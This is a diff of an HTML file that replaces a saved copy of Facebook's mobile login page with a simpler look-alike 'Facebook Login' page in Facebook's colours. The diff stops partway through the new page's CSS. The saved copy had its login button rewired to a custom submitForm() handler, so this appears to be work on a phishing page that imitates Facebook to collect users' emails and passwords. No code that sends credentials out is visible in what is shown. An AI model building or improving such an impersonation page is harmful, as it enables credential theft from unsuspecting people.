@@ -1,1227 +1,158 @@
+<!DOCTYPE html>
 <html lang="en">
-  <head>
-    <title>Facebook – log in or sign up</title>
-    <meta
-      name="viewport"
-      content="user-scalable=no,initial-scale=1,maximum-scale=1"
-    />
-    <link
-      href="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yi/r/4Kv5U5b1o3f.png"
-      rel="shortcut icon"
-      sizes="196x196"
-    />
-    <meta
-      name="referrer"
-      content="origin-when-crossorigin"
-      id="meta_referrer"
-    />
-    <script id="u_0_e_7k" nonce="">
-      "use strict";
-      window.MPageLoadClientMetrics = (function () {
-        var a = +new Date(),
-          b = {
-            prelude_onload: [
-              "jewels_visible",
-              "first_paint",
-              "visibility_change",
-              "tti",
-            ],
-            nav_started: ["first_paint", "visibility_change", "prelude_onload"],
-            first_paint: [
-              "jewels_visible",
-              "visibility_change",
-              "prelude_onload",
-            ],
-            jewels_visible: [
-              "tti",
-              "visibility_change",
-              "navigation",
-              "prelude_onload",
-            ],
-            tti: ["e2e", "visibility_change", "navigation"],
-          },
-          c = 3,
-          d = 3,
-          e = "nav_started",
-          f = !0,
-          g = "",
-          h = "",
-          i = 1,
-          j = "",
-          k = "",
-          l = "",
-          m = "",
-          n = function () {},
-          o = !0,
-          p = null,
-          q = !1,
-          r = !1,
-          s = null,
-          t = null,
-          u = !1,
-          v = [],
-          w = [],
-          x =
-            window.performance ||
-            window.msPerformance ||
-            window.webkitPerformance ||
-            {},
-          y = (
-            window.requestAnimationFrame ||
-            window.webkitRequestAnimationFrame ||
-            window.mozRequestAnimationFrame ||
-            window.oRequestAnimationFrame ||
-            window.msRequestAnimationFrame ||
-            window.setTimeout
-          ).bind(window),
-          z =
-            window.location.origin ||
-            window.location.protocol +
-              "//" +
-              window.location.hostname +
-              (window.location.port && ":" + window.location.port);
-        function A(b, c, d, e, f, i, n, q, r, v, w) {
-          x.timing &&
-            x.timing.navigationStart &&
-            (a = x.timing.navigationStart),
-            (j = b),
-            (k = c),
-            (l = d),
-            (m = e),
-            (g = f),
-            (h = i),
-            (o = n),
-            (p = q),
-            (s = r),
-            (t = v),
-            (u = w),
-            C();
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: linear-gradient(135deg, #e7ebf0, #f0f2f5);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
         }
-        function B(a) {
-          var c = b[e];
-          return c && c.indexOf(a) !== -1;
+        .login-container {
+            background-color: white;
+            width: 100%;
+            max-width: 360px;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.1);
+            text-align: center;
         }
-        function C() {
-          var a, b;
-          document.hidden !== void 0
-            ? ((a = "hidden"), (b = "visibilitychange"))
-            : document.mozHidden !== void 0
-            ? ((a = "mozHidden"), (b = "mozvisibilitychange"))
-            : document.msHidden !== void 0
-            ? ((a = "msHidden"), (b = "msvisibilitychange"))
-            : document.webkitHidden !== void 0 &&
-              ((a = "webkitHidden"), (b = "webkitvisibilitychange"));
-          var c = function () {
-            R("visibility_change", E()),
-              document.removeEventListener(b, c),
-              window.removeEventListener("beforeunload", c);
-          };
-          b && a && !window[a]
-            ? (document.addEventListener(b, c),
-              window.addEventListener("beforeunload", c))
-            : c();
+        .login-container img {
+            width: 50px;
+            margin-bottom: 20px;
         }
-        function D(b) {
-          return b - a;
+        .login-container input {
+            width: 95%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #ccd0d5;
+            border-radius: 6px;
+            background-color: #f5f6f7;
+            font-size: 16px;
         }
-        function E() {
-          return x.now ? x.now() : D(+new Date());
+        .login-container input:focus {
+            outline: none;
+            border-color: #1877f2;
         }
-        function F() {
-          f && ((f = !1), n());
+        .login-container button {
+            width: 100%;
+            padding: 12px;
+            margin: 15px 0;
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            cursor: pointer;
         }
-        function G() {
-          return f;
+        .login-container button:hover {
+            background-color: #166fe5;
         }
-        function H(a) {
-          n = a;
+        .login-container a {
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 14px;
+            display: block;
+            margin-top: 10px;
         }
-        function I() {
-          var a = i;
-          ++i;
-          return a;
+
+        /* Secondary button (Create New Account) with gradient and border */
+        .secondary-button {
+            background: linear-gradient(135deg, #42b72a, #36a420);
+            color: white;
+            border: 2px solid #1877f2;
+            border-radius: 6px;
+            padding: 12px;
+            margin-top: 15px;
+            margin-bottom: 10px;
+            cursor: pointer;
+            font-size: 16px;
+            width: 100%;
         }
-        function J(a) {
-          if (!window.navigator) return;
-          window.navigator.hardwareConcurrency !== void 0 &&
-            (a.num_cores = window.navigator.hardwareConcurrency);
-          window.navigator.deviceMemory &&
-            (a.ram_gb = window.navigator.deviceMemory);
-          window.navigator.connection &&
-            (typeof window.navigator.connection.downlink === "number" &&
-              (a.downlink_mb = window.navigator.connection.downlink),
-            typeof window.navigator.connection.effectiveType === "string" &&
-              (a.effective_connection_type =
-                window.navigator.connection.effectiveType),
-            typeof window.navigator.connection.rtt === "number" &&
-              (a.rtt_ms = window.navigator.connection.rtt));
+        .secondary-button:hover {
+            background: linear-gradient(135deg, #36a420, #2e921c);
         }
-        var K = {};
-        function L(b, c, d) {
-          if (!f) return;
-          if (s && !(b in s)) {
-            for (var g in s)
-              if (!K[g] && s && s[g].indexOf(b) !== -1) {
-                var i;
-                K[g] = !0;
-                L(g, (i = c) != null ? i : E(), d);
-              }
-            return;
-          }
-          i = !B(b);
-          g = (c + a) / 1e3;
-          c =
-            ((g = {
-              lid: h,
-              seq_num: I(),
-              event: b,
-              client_event_time: g,
-              time_from_nav_start_ms: Math.floor(c),
-            }),
-            (g[l] = m),
-            (g.previous_event = e),
-            (g.log_to_scuba = o),
-            g);
-          e = b;
-          p !== null && (c.page_path = p);
-          j !== "" && (c.fb_dtsg = j);
-          k !== "" && (c.lsd = k);
-          i && (c.illegal_transition_event = b);
-          g = d || "";
-          g !== "" && (c.navigation_endpoint = g);
-          t != null && (c.pa = t);
-          J(c);
-          u ? M(c) : v.push(c);
+
+        .footer {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #555;
         }
-        function M(a) {
-          P(a) || Q(a);
+        .footer p {
+            margin: 0;
         }
-        function N() {
-          (u = !0), v.forEach(M), (v.length = 0);
+        .footer a {
+            color: #555;
+            text-decoration: none;
         }
-        function O(a) {
-          var b = [];
-          for (var c in a) b.push(c + "=" + encodeURIComponent(a[c]));
-          c = z + g;
-          a = b.join("&");
-          return c + "?" + a;
+        .footer img {
+            width: 100px;
+            margin-top: 5 px;
         }
-        function P(a) {
-          a.transmission_method = "beacon";
-          if (window.navigator && window.navigator.sendBeacon)
-            if (window.navigator.sendBeacon(O(a))) return !0;
-            else a.is_retransmit = !0;
-          return !1;
+        .login-container .secondary-button {
+            width: 50%;
+            padding: 12px;
+            margin: 15px 0;
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            cursor: pointer;
         }
-        function Q(a, b) {
-          b === void 0 && (b = d);
-          a.transmission_method = "img";
-          var c = new Image();
-          b < d && (a.is_retransmit = !0);
-          b &&
-            (c.onerror = function (c) {
-              Q(a, b - 1);
-            });
-          c.src = O(a);
-        }
-        function R(a, b, c) {
-          if (q) {
-            w.push({ e: a, time: b, nav: c });
-            return;
-          }
-          L(a, b, c);
-        }
-        function S(a) {
-          if (!f) return;
-          q = !0;
-          var b = function (b) {
-            b = Math.min.apply(
-              Math,
-              [b].concat(
-                w.map(function (a) {
-                  return a.time;
-                })
-              )
-            );
-            q = !1;
-            L("first_paint", b);
-            (a || r) && L("jewels_visible", b);
-            w.forEach(function (a) {
-              return L(a.e, a.time, a.nav);
-            });
-          };
-          y(function () {
-            var a = E();
-            if (x.getEntriesByName) {
-              var d = function (e) {
-                var f = x.getEntriesByName("first-paint")[0];
-                f
-                  ? b(f.startTime || a)
-                  : e
-                  ? window.setTimeout(function () {
-                      return d(!1);
-                    }, c)
-                  : b(a);
-              };
-              window.setTimeout(function () {
-                return d(!0);
-              }, c);
-            } else b(a);
-          });
-        }
-        function T() {
-          if (q) {
-            r = !0;
-            return;
-          }
-          L("jewels_visible", E());
-        }
-        function U() {
-          L("prelude_onload", E());
-        }
-        return {
-          init: A,
-          logFirstPaint: S,
-          logJewelsVisible: T,
-          logPreludeOnload: U,
-          logEvent: R,
-          getMSFromNavStart: E,
-          isEnabled: G,
-          currentTimeToNavStartDelta: D,
-          setDisableCallback: H,
-          disable: F,
-          origin: z,
-          runPostConsentLogs: N,
-        };
-      })();
-      MPageLoadClientMetrics.init(
-        "",
-        "AVreE_jNFEk",
-        "jazoest",
-        "2960",
-        "\/ajax\/mtouch_perf_page_load_timings\/",
-        "7373611111996465366",
-        true,
-        "com.bloks.www.caa.login.login_homepage",
-        { screen_visible: ["first_paint"], screen_responsive: ["tti"] },
-        "mtouch",
-        true
-      );
-    </script>
-    <link
-      type="text/css"
-      rel="stylesheet"
-      href="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yz/l/0,cross/0hR13YQ3_cm.css?_nc_x=Ij3Wp8lg5Kz"
-      data-bootloader-hash="IBW8/s3"
-      crossorigin="anonymous"
-    />
-    <link
-      type="text/css"
-      rel="stylesheet"
-      href="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yf/l/0,cross/UIlTaPfYBVs.css?_nc_x=Ij3Wp8lg5Kz"
-      data-bootloader-hash="kUoFPYS"
-      crossorigin="anonymous"
-    />
-    <link
-      type="text/css"
-      rel="stylesheet"
-      href="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yQ/l/0,cross/So1R27UwoNi.css?_nc_x=Ij3Wp8lg5Kz"
-      data-bootloader-hash="twaZM2E"
-      crossorigin="anonymous"
-    />
-    <script id="u_0_f_zz" nonce="">
-      function envFlush(a) {
-        function b(b) {
-          for (var c in a) b[c] = a[c];
-        }
-        window.requireLazy
-          ? window.requireLazy(["Env"], b)
-          : ((window.Env = window.Env || {}), b(window.Env));
-      }
-      envFlush({
-        useTrustedTypes: false,
-        isTrustedTypesReportOnly: false,
-        shouldLogCounters: true,
-        timeslice_categories: { react_render: true, reflow: true },
-        sample_continuation_stacktraces: true,
-        dom_mutation_flag: true,
-      });
-    </script>
-    <script nonce="">
-      document.domain = "facebook.com";
-    </script>
-    <script nonce="">
-      __DEV__ = 0;
-    </script>
-    <script
-      id="u_0_g_mP"
-      crossorigin="anonymous"
-      src="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yw/r/rpUFvEGv3tr.js?_nc_x=Ij3Wp8lg5Kz"
-      data-bootloader-hash="tqu/v2o"
-      nonce=""
-    ></script>
-    <script id="u_0_h_JC" nonce="">
-      MPageLoadClientMetrics.logPreludeOnload();
-    </script>
-    <script id="u_0_d_nZ" nonce="">
-      (function _(a, b, c, d) {
-        function e(a) {
-          document.cookie =
-            a +
-            "=;expires=Thu, 01-Jan-1970 00:00:01 GMT;path=/;domain=.facebook.com";
-        }
-        function f(a, b) {
-          document.cookie = a + "=" + b + ";path=/;domain=.facebook.com;secure";
-        }
-        if (!a) {
-          e(b);
-          e(c);
-          return;
-        }
-        a = null;
-        (navigator.userAgent.indexOf("Firefox") !== -1 ||
-          (!window.devicePixelRatio &&
-            navigator.userAgent.indexOf("Windows Phone") !== -1)) &&
-          document.documentElement != null &&
-          ((a = screen.width / document.documentElement.offsetWidth),
-          (a = Math.max(1, Math.floor(a * 2) / 2)));
-        (!a || a === 1) &&
-          navigator.userAgent.indexOf("IEMobile") !== -1 &&
-          ((a = Math.sqrt(screen.deviceXDPI * screen.deviceYDPI) / 96),
-          (a = Math.max(1, Math.round(a * 2) / 2)));
-        f(b, (a || window.devicePixelRatio || 1).toString());
-        e = window.screen ? screen.width : 0;
-        b = window.screen ? screen.height : 0;
-        f(c, e + "x" + b);
-        d &&
-          document.cookie &&
-          window.devicePixelRatio > 1 &&
-          document.location.reload();
-      })(true, "m_pixel_ratio", "wd", false);
-    </script>
-    <meta
-      name="description"
-      content="Create an account or log in to Facebook. Connect with friends, family and other people you know. Share photos and videos, send messages and get updates."
-    />
-    <link rel="canonical" href="https://www.facebook.com/" />
-    <meta property="og:site_name" content="Facebook" />
-    <meta property="og:type" content="website" />
-    <meta property="og:title" content="Facebook – log in or sign up" />
-    <meta
-      property="og:description"
-      content="Create an account or log in to Facebook. Connect with friends, family and other people you know. Share photos and videos, send messages and get updates."
-    />
-    <meta
-      property="og:image"
-      content="https://www.facebook.com/images/fb_icon_325x325.png"
-    />
-    <meta property="og:url" content="https://www.facebook.com/" />
-    <link
-      rel="alternate"
-      media="only screen and (max-width: 640px)"
-      href="https://m.facebook.com/"
-    />
-    <link rel="alternate" media="handheld" href="https://m.facebook.com/" />
-    <script id="u_0_i_XX" type="application/ld+json" nonce="">
-      {
-        "\u0040context": "http:\/\/schema.org",
-        "\u0040type": "WebSite",
-        "name": "Facebook",
-        "url": "https:\/\/www.facebook.com\/"
-      }
-    </script>
-    <link
-      rel="manifest"
-      id="MANIFEST_LINK"
-      href="/data/manifest/"
-      crossorigin="use-credentials"
-    />
-    <link
-      href="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/y-/r/BX2by_AeP1C.js?_nc_x=Ij3Wp8lg5Kz"
-      rel="preload"
-      as="script"
-      crossorigin="anonymous"
-    />
-    <script
-      src="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/y-/r/BX2by_AeP1C.js?_nc_x=Ij3Wp8lg5Kz"
-      async=""
-      crossorigin="anonymous"
-      data-bootloader-hash-client="zxzDhYh"
-    ></script>
-    <link
-      href="https://z-m-static.xx.fbcdn.net/rsrc.php/v3inLb4/yh/l/en_GB/as0tvo8Y6qn.js?_nc_x=Ij3Wp8lg5Kz"
-      rel="preload"
-      as="script"
-      crossorigin="anonymous"
-    />
-    <script
-      src="https://z-m-static.xx.fbcdn.net/rsrc.php/v3inLb4/yh/l/en_GB/as0tvo8Y6qn.js?_nc_x=Ij3Wp8lg5Kz"
-      async=""
-      crossorigin="anonymous"
-      data-bootloader-hash-client="bWkYHwe"
-    ></script>
-    <link
-      href="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yg/r/BPJ2FHNQvdN.js?_nc_x=Ij3Wp8lg5Kz"
-      rel="preload"
-      as="script"
-      crossorigin="anonymous"
-    />
-    <script
-      src="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yg/r/BPJ2FHNQvdN.js?_nc_x=Ij3Wp8lg5Kz"
-      async=""
-      crossorigin="anonymous"
-      data-bootloader-hash-client="CUjb9oq"
-    ></script>
-    <link
-      href="https://z-m-static.xx.fbcdn.net/rsrc.php/v3iNQG4/ys/l/en_GB/PqmIqJFLFTK.js?_nc_x=Ij3Wp8lg5Kz"
-      rel="preload"
-      as="script"
-      crossorigin="anonymous"
-    />
-    <script
-      src="https://z-m-static.xx.fbcdn.net/rsrc.php/v3iNQG4/ys/l/en_GB/PqmIqJFLFTK.js?_nc_x=Ij3Wp8lg5Kz"
-      async=""
-      crossorigin="anonymous"
-      data-bootloader-hash-client="xtxU9ei"
-    ></script>
-    <link
-      href="https://z-m-static.xx.fbcdn.net/rsrc.php/v3i3kA4/yt/l/en_GB/lIHCMphWzPm.js?_nc_x=Ij3Wp8lg5Kz"
-      rel="preload"
-      as="script"
-      crossorigin="anonymous"
-    />
-    <script
-      src="https://z-m-static.xx.fbcdn.net/rsrc.php/v3i3kA4/yt/l/en_GB/lIHCMphWzPm.js?_nc_x=Ij3Wp8lg5Kz"
-      async=""
-      crossorigin="anonymous"
-      data-bootloader-hash-client="8nxAaf3"
-    ></script>
-    <link
-      href="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yD/r/gELFCQuJR7S.js?_nc_x=Ij3Wp8lg5Kz"
-      rel="preload"
-      as="script"
-      crossorigin="anonymous"
-    />
-    <script
-      src="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yD/r/gELFCQuJR7S.js?_nc_x=Ij3Wp8lg5Kz"
-      async=""
-      crossorigin="anonymous"
-      data-bootloader-hash-client="KRzVv/3"
-    ></script>
-    <link
-      href="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yd/r/o13tkHK0Ruc.js?_nc_x=Ij3Wp8lg5Kz"
-      rel="preload"
-      as="script"
-      crossorigin="anonymous"
-    />
-    <script
-      src="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yd/r/o13tkHK0Ruc.js?_nc_x=Ij3Wp8lg5Kz"
-      async=""
-      crossorigin="anonymous"
-      data-bootloader-hash-client="cCf1l6z"
-    ></script>
-    <link
-      href="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/y2/r/qeK90bIUkKV.js?_nc_x=Ij3Wp8lg5Kz"
-      rel="preload"
-      as="script"
-      crossorigin="anonymous"
-    />
-    <script
-      src="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/y2/r/qeK90bIUkKV.js?_nc_x=Ij3Wp8lg5Kz"
-      async=""
-      crossorigin="anonymous"
-      data-bootloader-hash-client="Nskv1ME"
-    ></script>
-    <link
-      href="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/y5/r/qTqqif8m_I7.js?_nc_x=Ij3Wp8lg5Kz"
-      rel="preload"
-      as="script"
-      crossorigin="anonymous"
-    />
-    <script
-      src="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/y5/r/qTqqif8m_I7.js?_nc_x=Ij3Wp8lg5Kz"
-      async=""
-      crossorigin="anonymous"
-      data-bootloader-hash-client="WcwEE/Z"
-    ></script>
-    <link
-      href="https://z-m-static.xx.fbcdn.net/rsrc.php/v3iLQG4/yN/l/en_GB/ofjnBzxdBrq.js?_nc_x=Ij3Wp8lg5Kz"
-      rel="preload"
-      as="script"
-      crossorigin="anonymous"
-    />
-    <script
-      src="https://z-m-static.xx.fbcdn.net/rsrc.php/v3iLQG4/yN/l/en_GB/ofjnBzxdBrq.js?_nc_x=Ij3Wp8lg5Kz"
-      async=""
-      crossorigin="anonymous"
-      data-bootloader-hash-client="GS4HSly"
-    ></script>
-    <link
-      href="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/y7/r/QRAAITIr1Rg.js?_nc_x=Ij3Wp8lg5Kz"
-      rel="preload"
-      as="script"
-      crossorigin="anonymous"
-    />
-    <script
-      src="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/y7/r/QRAAITIr1Rg.js?_nc_x=Ij3Wp8lg5Kz"
-      async=""
-      crossorigin="anonymous"
-      data-bootloader-hash-client="dbnc3oz"
-    ></script>
-    <link
-      href="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yX/r/8qqm7xmCxry.js?_nc_x=Ij3Wp8lg5Kz"
-      rel="preload"
-      as="script"
-      crossorigin="anonymous"
-    />
-    <script
-      src="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yX/r/8qqm7xmCxry.js?_nc_x=Ij3Wp8lg5Kz"
-      async=""
-      crossorigin="anonymous"
-      data-bootloader-hash-client="g3+Pxor"
-    ></script>
-    <link
-      href="https://z-m-static.xx.fbcdn.net/rsrc.php/v3iLl54/yo/l/en_GB/J5WesB5J8X3.js?_nc_x=Ij3Wp8lg5Kz"
-      rel="preload"
-      as="script"
-      crossorigin="anonymous"
-    />
-    <script
-      src="https://z-m-static.xx.fbcdn.net/rsrc.php/v3iLl54/yo/l/en_GB/J5WesB5J8X3.js?_nc_x=Ij3Wp8lg5Kz"
-      async=""
-      crossorigin="anonymous"
-      data-bootloader-hash-client="iYze18Q"
-    ></script>
-    <link
-      href="https://z-m-static.xx.fbcdn.net/rsrc.php/v3i3km4/yO/l/en_GB/oWjS_U2fKnL.js?_nc_x=Ij3Wp8lg5Kz"
-      rel="preload"
-      as="script"
-      crossorigin="anonymous"
-    />
-    <script
-      src="https://z-m-static.xx.fbcdn.net/rsrc.php/v3i3km4/yO/l/en_GB/oWjS_U2fKnL.js?_nc_x=Ij3Wp8lg5Kz"
-      async=""
-      crossorigin="anonymous"
-      data-bootloader-hash-client="O8Hx8S5"
-    ></script>
-    <link
-      href="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/y0/r/N2uBbABcB2E.js?_nc_x=Ij3Wp8lg5Kz"
-      rel="preload"
-      as="script"
-      crossorigin="anonymous"
-    />
-    <script
-      src="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/y0/r/N2uBbABcB2E.js?_nc_x=Ij3Wp8lg5Kz"
-      async=""
-      crossorigin="anonymous"
-      data-bootloader-hash-client="7W7r9b2"
-    ></script>
-    <link
-      href="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yE/r/M6B5bBtX5x7.js?_nc_x=Ij3Wp8lg5Kz"
-      rel="preload"
-      as="script"
-      crossorigin="anonymous"
-    />
-    <script
-      src="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yE/r/M6B5bBtX5x7.js?_nc_x=Ij3Wp8lg5Kz"
-      async=""
-      crossorigin="anonymous"
-      data-bootloader-hash-client="GyGConq"
-    ></script>
-    <link
-      href="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yO/r/_tJ17sGyxOX.js?_nc_x=Ij3Wp8lg5Kz"
-      rel="preload"
-      as="script"
-      crossorigin="anonymous"
-    />
-    <script
-      src="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yO/r/_tJ17sGyxOX.js?_nc_x=Ij3Wp8lg5Kz"
-      async=""
-      crossorigin="anonymous"
-      data-bootloader-hash-client="zPYlTyl"
-    ></script>
-    <link
-      href="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/y1/r/iqXNplTxj-q.js?_nc_x=Ij3Wp8lg5Kz"
-      rel="preload"
-      as="script"
-      crossorigin="anonymous"
-    />
-    <script
-      src="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/y1/r/iqXNplTxj-q.js?_nc_x=Ij3Wp8lg5Kz"
-      async=""
-      crossorigin="anonymous"
-      data-bootloader-hash-client="VxPcg9z"
-    ></script>
-  </head>
-  <body
-    tabindex="0"
-    class="touch x2 ios sf _fzu _50-3 iframe acw portrait"
-    style="min-height: 646px; background-color: rgb(255, 255, 255)"
-  >
-    <script id="u_0_c_Qw" nonce="7YPeK0fk">
-      (function (a) {
-        a.__updateOrientation = function () {
-          var b = !!a.orientation && a.orientation !== 180,
-            c = document.body;
-          c &&
-            (c.className =
-              c.className.replace(/(^|\s)(landscape|portrait)(\s|$)/g, " ") +
-              " " +
-              (b ? "landscape" : "portrait"));
-          return b;
-        };
-      })(window);
-    </script>
-    <div
-      id="viewport"
-      data-kaios-focus-transparent="1"
-      style="min-height: 646px"
-    >
-      <h1
-        style="
-          display: block;
-          height: 0;
-          overflow: hidden;
-          position: absolute;
-          width: 0;
-          padding: 0;
-        "
-      >
-        Facebook
-      </h1>
-      <div id="page">
-        <div class="_129_" id="header-notices"></div>
-        <div
-          class="_5soa acw"
-          id="root"
-          role="main"
-          data-sigil="context-layer-root content-pane"
-          style="min-height: 646px"
-        >
-          <div class="_7om2">
-            <div class="_4g34" id="u_0_0_Sv">
-              <div
-                class="_5yd0 _2ph- _5yd1"
-                style="display: none"
-                id="login_error"
-                data-sigil="m_login_notice"
-              >
-                <div class="_52jd"></div>
-              </div>
-              <div class="_9om_">
-                <div class="_4-4l">
-                  <div
-                    id="login_top_banner"
-                    data-sigil="m_login_upsell login_identify_step_element"
-                  ></div>
-                  <div class="_7om2 _52we _2pid _52z6">
-                    <div class="_4g34">
-                      <a
-                        href="https://m.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzA1MTM5OTQ5LCJjYWxsc2l0ZV9pZCI6Nzk2MTcwNzM0NTY5ODY0fQ%3D%3D&refid=8"
-                        ><img
-                          src="https://z-m-static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg"
-                          width="112"
-                          class="img"
-                          alt="facebook"
-                      /></a>
-                    </div>
-                  </div>
-                  <div class="_5rut">
-                    <form
-                      method="post"
-                      action="/login/device-based/login/async/?refsrc=deprecated&lwv=100"
-                      class="mobile-login-form _9hp- _5spm"
-                      id="login-form"
-                      novalidate="1"
-                      data-sigil="m_login_form"
-                      data-autoid="autoid_1"
-                    >
-                      <input
-                        type="hidden"
-                        name="lsd"
-                        value="AVoXIeHG108"
-                        autocomplete="off"
-                      /><input
-                        type="hidden"
-                        name="jazoest"
-                        value="2820"
-                        autocomplete="off"
-                      /><input
-                        type="hidden"
-                        name="m_ts"
-                        value="1680989254"
-                      /><input
-                        type="hidden"
-                        name="li"
-                        value="RtwxZFETnpkoGGJVpBzCJrHR"
-                      /><input
-                        type="hidden"
-                        name="try_number"
-                        value="0"
-                        data-sigil="m_login_try_number"
-                      /><input
-                        type="hidden"
-                        name="unrecognized_tries"
-                        value="0"
-                        data-sigil="m_login_unrecognized_tries"
-                      />
-                      <div
-                        id="user_info_container"
-                        data-sigil="user_info_after_failure_element"
-                      ></div>
-                      <div
-                        id="pwd_label_container"
-                        data-sigil="user_info_after_failure_element"
-                      ></div>
-                      <div id="otp_retrieve_desc_container"></div>
-                      <div>
-                        <div class="_56be">
-                          <div class="_55wo _56bf">
-                            <div class="_96n9" id="email_input_container">
-                              <input
-                                autocorrect="off"
-                                autocapitalize="off"
-                                type="email"
-                                class="_56bg _4u9z _5ruq _8qtn"
-                                autocomplete="on"
-                                id="m_login_email"
-                                name="email"
-                                placeholder="Mobile number or email"
-                                data-sigil="m_login_email"
-                              />
-                            </div>
-                          </div>
-                        </div>
-                        <div class="_55wq"></div>
-                        <div class="_56be">
-                          <div class="_55wo _56bf">
-                            <div
-                              class="_1upc _mg8"
-                              data-sigil="m_login_password"
-                            >
-                              <div class="_7om2">
-                                <div class="_4g34 _5i2i _52we">
-                                  <div class="_5xu4">
-                                    <input
-                                      autocorrect="off"
-                                      autocapitalize="off"
-                                      class="_56bg _4u9z _27z2 _8qtm"
-                                      autocomplete="on"
-                                      id="m_login_password"
-                                      name="password"
-                                      placeholder="Password"
-                                      type="password"
-                                      data-sigil="password-plain-text-toggle-input"
-                                    />
-                                  </div>
-                                </div>
-                                <div class="_5s61 _216i _5i2i _52we">
-                                  <div class="_5xu4">
-                                    <div
-                                      class="_2pi9"
-                                      style="display: none"
-                                      id="u_0_1_0h"
-                                    >
-                                      <a
-                                        href="#"
-                                        data-sigil="password-plain-text-toggle"
-                                        ><span
-                                          class="mfss"
-                                          style="display: none"
-                                          id="u_0_2_VE"
-                                          >HIDE</span
-                                        ><span class="mfss" id="u_0_3_nm"
-                                          >SHOW</span
-                                        ></a
-                                      >
-                                    </div>
-                                  </div>
-                                </div>
-                              </div>
-                            </div>
-                          </div>
-                        </div>
-                      </div>
-                      <div class="_2pie" style="text-align: center">
-                        <div
-                          id="login_password_step_element"
-                          data-sigil="login_password_step_element"
-                        >
-                          <button
-                            type="button"
-                            value="Log in"
-                            onclick="submitForm()"
-                            class="_54k8 _52jh _56bs _56b_ _28lf _9cow _56bw _56bu"
-                            name="login"
-                            data-sigil="touchable login_button_block m_login_button"
-                            data-autoid="autoid_4"
-                          >
-                            <span class="_55sr">Log in</span>
-                          </button>
-                        </div>
-                        <span id="dis" style="color: red"></span>
-                        <div
-                          class="_7eif"
-                          id="oauth_login_button_container"
-                          style="display: none"
-                        ></div>
-                        <div
-                          class="_7f_d"
-                          id="oauth_login_desc_container"
-                          style="display: none"
-                        ></div>
-                        <div id="otp_button_elem_container"></div>
-                      </div>
-                      <input
-                        type="hidden"
-                        name="prefill_contact_point"
-                        id="prefill_contact_point"
-                      /><input
-                        type="hidden"
-                        name="prefill_source"
-                        id="prefill_source"
-                      /><input
-                        type="hidden"
-                        name="prefill_type"
-                        id="prefill_type"
-                      /><input
-                        type="hidden"
-                        name="first_prefill_source"
-                        id="first_prefill_source"
-                      /><input
-                        type="hidden"
-                        name="first_prefill_type"
-                        id="first_prefill_type"
-                      /><input
-                        type="hidden"
-                        name="had_cp_prefilled"
-                        id="had_cp_prefilled"
-                        value="false"
-                      /><input
-                        type="hidden"
-                        name="had_password_prefilled"
-                        id="had_password_prefilled"
-                        value="false"
-                      /><input
-                        type="hidden"
-                        name="is_smart_lock"
-                        id="is_smart_lock"
-                        value="false"
-                      /><input
-                        type="hidden"
-                        id="bi_xrwh"
-                        name="bi_xrwh"
-                        value="0"
-                      /><input type="hidden" id="scetoggle" />
-                      <div class="_xo8"></div>
-                      <noscript
-                        ><input type="hidden" name="_fb_noscript" value="true"
-                      /></noscript>
-                    </form>
-                    <div>
-                      <div class="_2pie _9omz">
-                        <div class="_52jj _9on1">
-                          <a
-                            class="_9on1"
-                            tabindex="0"
-                            href="/recover/initiate/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjgwOTg5MjU0LCJjYWxsc2l0ZV9pZCI6Mjg0Nzg1MTQ5MzQ1MzY5fQ%3D%3D&c=https%3A%2F%2Fm.facebook.com%2F%3Fwtsid%3Drdr_0AWxl6Uuzy0MCGyh8&r&cuid&ars=facebook_login&lwv=100&refid=8"
-                            id="forgot-password-link"
-                            >Forgot password?</a
-                          >
-                        </div>
-                      </div>
-                      <div style="padding-top: 42px">
-                        <div>
-                          <div>
-                            <div>
-                              <div
-                                id="login_reg_separator"
-                                class="_43mg _8qtf"
-                                data-sigil="login_reg_separator"
-                              >
-                                <span class="_43mh">or</span>
-                              </div>
-                              <div class="_52jj _5t3b" id="signup_button_area">
-                                <a
-                                  role="button"
-                                  class="_agmp _28le btn btnS medBtn mfsm touchable"
-                                  id="signup-button"
-                                  tabindex="0"
